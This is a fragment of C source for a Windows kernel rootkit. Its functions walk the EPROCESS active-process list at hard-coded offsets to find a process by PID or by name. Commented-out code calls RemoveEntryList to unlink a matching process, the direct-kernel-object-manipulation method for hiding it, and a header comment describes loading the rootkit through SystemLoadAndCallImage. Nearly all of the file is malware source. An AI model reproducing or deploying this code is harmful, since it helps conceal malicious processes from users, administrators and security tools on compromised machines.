ULONG64 FindProcessEPROC(ULONG64 terminate_PID)
{
	ULONG64 eproc = 0;
	ULONG64   current_PID = 0;
	ULONG64   start_PID = 0;
	ULONG64   i_count = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	eproc = (ULONG64)PsGetCurrentProcess();
	start_PID = *((PULONG64)((PUCHAR)eproc + PIDOFFSET));
	current_PID = start_PID;

	while (1)
	{
		if (terminate_PID == current_PID)
			return eproc;
		else if ((i_count >= 1) && (start_PID == current_PID))
		{
			return 0;
		}
		else {
			plist_active_procs = (LIST_ENTRY *)(eproc + FLINKOFFSET);
			eproc = (ULONG64)plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			current_PID = *((PULONG64)(eproc + PIDOFFSET));
			i_count++;
		}
	}
}

ULONG64 FindProcessEPROCByName(PCHAR process_name)
{
	SIZE_T	length = strlen(process_name);
	PLIST_ENTRY list_node = (PLIST_ENTRY)(SYSPROCESS + FLINKOFFSET);
	do {
		if (*(PULONGLONG)((PUCHAR)list_node - FLINKOFFSET + EXITITMEOFFSET) == 0) {
			PUCHAR image_process_name = (PUCHAR)list_node - FLINKOFFSET + PROCESSNAMEOFFSET;
			//Ktrace("ROOTKIT: Process : %s", image_process_name);
			if (memcmp(image_process_name, process_name, length) == 0) {
				/*Remove_Entry = list_node;
				RemoveEntryList(list_node);
				Ktrace("ROOTKIT: RemoveEntryList : %llx-%s", (PULONGLONG)Remove_Entry, image_process_name);*/
				return (ULONG64)((PUCHAR)list_node - FLINKOFFSET);
			}
		}
		list_node = list_node->Flink;
	} while (SYSPROCESS != (PUCHAR)list_node - FLINKOFFSET);

	return 0;
}

///////////////////////////////////////////////////////////////////
// ULONG GetLocationOfProcessName
// Parameters:
//       IN PEPROCESS    pointer to the kernel process block of 
//						 the current process
// Returns:
//		 OUT ULONG		 offset of process name in EPROCESS structure
//     
// Description: Gets the location if the name of the process in the 
//				kernel process block. This is done because EPROCESS
//				changes between versions of NT/2000/XP. This technique
//				was first done by Sysinternals. They rock! But my
//				function is different because it can be called at anytime
//				not just at DriverEntry. Using my method, you can load the 
//				rootkit using SystemLoadAndCallImage as was discovered by 
//				Greg Hoglund.
//
// Note:        The reason this works is because it walks the list of
//				processes looking in the EPROCESS block for the string
//				"System".

ULONG GetLocationOfProcessName(PEPROCESS CurrentProc)
{
	ULONG ul_offset;
	PLIST_ENTRY plist_active_procs;

	//	while(1)
	//	{
	for (ul_offset = 0; ul_offset < PAGE_SIZE; ul_offset++) // This will fail if EPROCESS
		// grows bigger than PAGE_SIZE
	{
		if (!strncmp("System", (PCHAR)CurrentProc + ul_offset, strlen("System")))
		{
			return ul_offset;
		}
	}

	//		plist_active_procs = (LIST_ENTRY *) ((DWORD)CurrentProc+FLINKOFFSET);
	//		(DWORD)CurrentProc = (DWORD) plist_active_procs->Flink;
	//		(DWORD)CurrentProc = (DWORD) CurrentProc - FLINKOFFSET;
	//	}

	return (ULONG)0;
}
